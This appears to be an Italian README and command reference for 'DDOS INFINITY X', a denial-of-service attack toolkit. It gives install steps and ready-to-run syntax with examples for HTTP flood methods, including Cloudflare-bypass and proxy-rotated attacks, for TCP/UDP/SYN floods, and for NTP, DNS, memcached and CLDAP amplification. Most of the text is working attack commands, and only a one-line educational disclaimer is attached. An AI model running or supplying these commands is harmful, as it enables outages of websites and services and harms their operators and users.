# DDOS INFINITY X — Tutti i comandi

## Installazione

### Linux / Kali

```bash
git clone https://github.com/Infinity-X202/DDOS-INFINITY-X.git
cd DDOS-INFINITY-X
chmod +x install.sh run.sh check.sh
./install.sh
```

### Windows

```cmd
git clone https://github.com/Infinity-X202/DDOS-INFINITY-X.git
cd DDOS-INFINITY-X
install.bat
```

---

## Uso quotidiano

```bash
./run.sh              # menu
./run.sh HELP         # guida
./run.sh tools        # console strumenti
./run.sh STOP         # ferma processi
./check.sh            # verifica dipendenze
```

---

## Layer 7 — sintassi

```bash
./run.sh METODO URL SOCKS_TYPE THREADS PROXY_FILE RPC DURATA
```

**Esempio:**

```bash
./run.sh GET http://example.com 0 100 http.txt 10 60
./run.sh POST http://example.com 1 200 http.txt 20 120
./run.sh CFB https://example.com 5 150 http.txt 10 90
```

**Metodi L7:** GET, POST, OVH, CFB, CFBUAM, BYPASS, SLOW, STRESS, DGB, BOT, XMLRPC, TOR, KILLER, BOMB, …

**Socks type:** `0` all (config) · `1` HTTP · `4` SOCKS4 · `5` SOCKS5 · `6` random

---

## Layer 4 — sintassi

```bash
./run.sh METODO IP:PORTA THREADS DURATA
```

**Esempio:**

```bash
./run.sh TCP 10.0.0.5:80 50 30
./run.sh UDP 10.0.0.5:53 100 60
./run.sh SYN 10.0.0.5:443 80 45
```

**Con proxy:**

```bash
./run.sh TCP 10.0.0.5:80 50 30 5 http.txt
```

**Metodi L4:** TCP, UDP, SYN, ICMP, MINECRAFT, FIVEM, TS3, VSE, CPS, CONNECTION, …

**Amplification** (solo lab autorizzato): MEM, NTP, DNS, RDP, CHAR, CLDAP, ARD + file reflector

---

## Tools

```bash
./run.sh tools
```

Comandi nella console: `PING`, `CHECK`, `DSTAT`, `DNS`, `TSSRV`, `HELP`, `CLEAR`, `EXIT`

---

## Docker (opzionale)

```bash
sudo apt install docker.io docker-compose-v2
docker compose build
docker compose run -it --entrypoint /bin/bash infinityx
python start.py HELP
```

---

## File importanti

| File | Ruolo |
|------|--------|
| `config.json` | Proxy providers, Minecraft |
| `files/proxies/http.txt` | Lista proxy |
| `files/useragent.txt` | User-Agent |
| `files/referers.txt` | Referer |
| `venv/` | Ambiente Python (creato da install.sh) |

---

## Disclaimer

For educational purposes only. Unauthorized testing is illegal.
